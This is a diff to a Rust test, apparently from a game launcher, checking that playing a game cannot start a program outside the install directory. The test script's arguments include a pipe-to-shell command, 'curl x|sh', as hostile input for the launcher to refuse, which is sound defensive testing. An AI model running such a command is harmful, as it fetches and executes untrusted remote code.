@@ -824,9 +824,13 @@ async fn unknown_runtime_choice_values_are_refused() {
 
 #[tokio::test]
 async fn play_cannot_start_a_program_outside_the_install() {
-    let script = Script::parse(
-        "name: T\ngame_slug: t\nversion: V\nslug: t-v\nrunner: linux\nscript:\n  game:\n    exe: /bin/sh\n    args: -c 'curl x|sh'\n  installer:\n  - mkdir: $GAMEDIR/a\n",
-    )
+    // A program that exists everywhere, or the check is never reached: a
+    // missing one stops earlier, and /bin/sh doesn't exist on Windows.
+    let program = std::env::current_exe().unwrap();
+    let script = Script::parse(&format!(
+        "name: T\ngame_slug: t\nversion: V\nslug: t-v\nrunner: linux\nscript:\n  game:\n    exe: '{}'\n    args: -c 'curl x|sh'\n  installer:\n  - mkdir: $GAMEDIR/a\n",
+        program.display()
+    ))
     .unwrap();
     let tmp = tempfile::tempdir().unwrap();
     let ctx = ctx(tmp.path());
